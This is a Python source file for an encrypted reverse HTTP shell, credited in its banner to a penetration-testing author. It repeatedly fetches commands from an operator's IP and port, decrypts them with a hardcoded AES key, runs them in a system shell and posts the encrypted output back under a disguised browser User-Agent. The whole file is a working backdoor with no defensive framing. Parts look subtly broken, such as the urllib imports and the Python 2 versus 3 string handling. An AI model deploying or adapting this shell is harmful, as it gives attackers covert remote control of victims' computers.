import urllib
from Crypto.Cipher import AES
import sys
import os
import http.client
import subprocess
import base64
import time
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
random = "sdfdsfdsdfsfd@#2$"
cipher = AES.new(secret)
PROXY_SUPPORT = "OFF"
PROXY_URL = "http://proxystuff:80"
USERNAME = "username_here"
PASSWORD = "password_here"
if PROXY_SUPPORT == "ON":
    auth_handler = urllib.request.HTTPBasicAuthHandler()
    auth_handler.add_password(realm='RESTRICTED ACCESS', uri=PROXY_URL,
                              user=USERNAME, passwd=PASSWORD)
    opener = urllib.request.build_opener(auth_handler)
    urllib.request.install_opener(opener)
try:
    address = sys.argv[1]
    port = sys.argv[2]
except IndexError:
    print(" \nAES Encrypted Reverse HTTP Shell by:")
    print("        Dave Kennedy (ReL1K)")
    print("      http://www.trustedsec.com")
    print("Usage: shell.exe <reverse_ip_address> <rport>")
    time.sleep(0.1)
    sys.exit()
while 1:
    req = urllib.request.Request('http://%s:%s' % (address, port))
    message = urllib.request.urlopen(req)
    message = base64.b64decode(message.read())
    message = DecodeAES(cipher, message)
    if message == "quit" or message == "exit":
        sys.exit()
    message = message.replace("{", "")
    proc = subprocess.Popen(message, shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    data = proc.stdout.read() + proc.stderr.read()
    data = EncodeAES(cipher, data)
    data = base64.b64encode(data)
    data = urllib.parse.urlencode({'cmd': '%s'}) % (data)
    h = http.client.HTTPConnection('%s:%s' % (address, port))
    headers = {"User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
               "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    h.request('POST', '/index.aspx', data, headers)